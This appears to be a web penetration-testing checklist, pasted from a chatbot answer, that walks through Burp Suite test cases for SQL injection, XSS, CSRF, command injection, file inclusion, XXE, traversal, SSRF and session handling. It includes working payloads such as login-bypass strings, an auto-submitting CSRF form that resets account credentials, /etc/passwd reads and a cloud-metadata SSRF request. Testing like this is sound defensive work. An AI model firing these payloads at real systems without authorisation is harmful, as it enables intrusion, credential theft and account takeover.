## 1. SQL Injection
Test Case: SQL Injection in Login Form
```
Objective: Test if the login form is vulnerable to SQL injection.
Steps:
Intercept the login request using Burp Suite Proxy.
Send the request to Burp Suite Repeater.
Modify the input fields to include SQL injection payloads.
Analyze the response to check for SQL errors or successful bypass.
Example Payloads:

' OR '1'='1
' OR '1'='1'--
admin'--
Example Request:

makefile
Copy code
POST /login HTTP/1.1
Host: www.test.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin'--&password=123
```

## 2. Cross-Site Scripting (XSS)
Test Case: Reflected XSS in Search Function
```
Objective: Test if the search function is vulnerable to reflected XSS.
Steps:
Intercept the search request using Burp Suite Proxy.
Send the request to Burp Suite Repeater.
Modify the search parameter to include XSS payloads.
Analyze the response to check if the payload is executed.
Example Payloads:

<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
Example Request:

javascript
Copy code
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: www.test.com
```

## 3. Cross-Site Request Forgery (CSRF)
```
Test Case: CSRF in Account Settings Update

Objective: Test if the account settings update functionality is vulnerable to CSRF.
Steps:
Capture the account settings update request using Burp Suite Proxy.
Craft a CSRF exploit page that will send the captured request.
Host the CSRF exploit page on a web server.
Visit the CSRF exploit page while authenticated to the target site and check if the action is performed.
Example CSRF Exploit Page:

html
Copy code
<html>
  <body>
    <form action="http://www.test.com/account/update" method="POST">
      <input type="hidden" name="email" value="attacker@example.com">
      <input type="hidden" name="password" value="newpassword123">
      <input type="submit" value="Submit">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## 4. Command Injection
```
Test Case: Command Injection in File Upload

Objective: Test if the file upload functionality is vulnerable to command injection.
Steps:
Capture the file upload request using Burp Suite Proxy.
Send the request to Burp Suite Repeater.
Modify the filename parameter to include command injection payloads.
Analyze the response to check for command execution.
Example Payloads:

filename=|whoami
filename=;ls
Example Request:

bash
Copy code
POST /upload HTTP/1.1
Host: www.test.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 221

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

test content
------WebKitFormBoundary--
```

## 5. Local File Inclusion (LFI)
```
Test Case: Local File Inclusion in File Parameter

Objective: Test if the file parameter is vulnerable to local file inclusion.
Steps:
Intercept the request containing the file parameter using Burp Suite Proxy.
Send the request to Burp Suite Repeater.
Modify the file parameter to include LFI payloads.
Analyze the response to check if the file contents are included.
Example Payloads:

file=../../../../etc/passwd
file=../../../../var/www/html/index.php
Example Request:

bash
Copy code
GET /view?file=../../../../etc/passwd HTTP/1.1
Host: www.test.com
```

## 6. XML External Entity (XXE)
```
Test Case: XXE in XML Input

Objective: Test if the XML input is vulnerable to XXE.
Steps:
Capture the XML input request using Burp Suite Proxy.
Send the request to Burp Suite Repeater.
Modify the XML payload to include XXE payloads.
Analyze the response to check if external entities are processed.
Example Payloads:

xml
Copy code
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
Example Request:

xml
Copy code
POST /xml HTTP/1.1
Host: www.test.com
Content-Type: application/xml
Content-Length: 137

<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

## 7. Directory Traversal
```
Test Case: Directory Traversal in File Parameter

Objective: Test if the file parameter is vulnerable to directory traversal.
Steps:
Intercept the request containing the file parameter using Burp Suite Proxy.
Send the request to Burp Suite Repeater.
Modify the file parameter to include directory traversal payloads.
Analyze the response to check if directory traversal is possible.
Example Payloads:

file=../../../../etc/passwd
file=../../../../var/www/html/index.php
Example Request:

bash
Copy code
GET /download?file=../../../../etc/passwd HTTP/1.1
Host: www.test.com
```

## 8. Server-Side Request Forgery (SSRF)
```
Test Case: SSRF in URL Parameter

Objective: Test if the URL parameter is vulnerable to SSRF.
Steps:
Capture the request containing the URL parameter using Burp Suite Proxy.
Send the request to Burp Suite Repeater.
Modify the URL parameter to include SSRF payloads.
Analyze the response to check if internal resources can be accessed.
Example Payloads:

url=http://localhost:8080
url=http://169.254.169.254/latest/meta-data/
Example Request:

bash
Copy code
GET /fetch?url=http://localhost:8080 HTTP/1.1
Host: www.test.com
```

## 9. Session Management
```
Test Case: Session Token Analysis

Objective: Analyze the randomness of session tokens.
Steps:
Capture multiple session tokens using Burp Suite Proxy.
Send the tokens to Burp Suite Sequencer.
Analyze the randomness and predictability of session tokens using Sequencer.
Example Tokens:

makefile
Copy code
session_id=abc123xyz
session_id=def456uvw
session_id=ghi789rst
Test Case: Session Fixation

Objective: Test if session tokens are properly changed after login.
Steps:
Capture the session token before login using Burp Suite Proxy.
Capture the session token after login using Burp Suite Proxy.
Compare the tokens to check if they are different.
Example Tokens:

mathematica
Copy code
Before Login: session_id=abc123xyz
After Login: session_id=def456uvw
These test cases provide a structured approach to identifying common web vulnerabilities using Burp Suite. By following these steps and using the provided example payloads, you can effectively test and secure the web application.
```
